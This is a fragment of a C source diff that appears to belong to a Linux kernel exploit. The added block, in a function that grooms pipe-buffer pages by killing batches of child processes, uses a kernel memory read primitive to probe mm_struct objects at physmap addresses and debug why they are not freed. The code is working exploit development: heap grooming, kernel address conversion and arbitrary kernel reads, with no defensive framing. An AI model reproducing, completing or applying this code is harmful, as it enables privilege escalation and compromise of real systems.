@@ -618,6 +618,31 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
         pr_info("pipe batch kill w=%d sent=%d reaped=%d werr=%d\n", w,
                 kill_sent, reaped, werr);
         taken_wave = w;
+        /*
+         * Post-kill object probe: +20 stays NULL after reaped=660, so the
+         * 34 objects were never kmem_cache_freed.  Read word0 of the first
+         * three objects (physmap + i*0x3c0): mm_struct starts with
+         * {mm_users:u32, mm_count:u32}.  mm_users>1 after the owner was
+         * reaped => a kernel holder kept the mm alive (mmdrop deferred);
+         * both zero => header looks dropped but never hit the freelist;
+         * garbage => the objects are not wave mms at all (long-lived
+         * filler hypothesis).
+         */
+        {
+          uintptr_t ph2 = direct_to_head_page(conv_fd, base);
+          if (ph2) {
+            uintptr_t phys = page_to_direct(ph2);
+            if (phys) {
+              uint64_t o0 = kernel_read64(conv_fd, phys);
+              uint64_t o1 = kernel_read64(conv_fd, phys + 0x3c0);
+              uint64_t o2 = kernel_read64(conv_fd, phys + 2 * 0x3c0);
+              pr_info("pipe objprobe w=%d phys=%016zx o0=%016llx o1=%016llx "
+                      "o2=%016llx\n",
+                      w, phys, (unsigned long long)o0, (unsigned long long)o1,
+                      (unsigned long long)o2);
+            }
+          }
+        }
         /* The just-killed children's mm_structs are not always reclaimed
          * by the time waitpid returns (TLB/RCU/memcg tail), and every
          * failing round read inuse=34 the instant it looked -- so the page
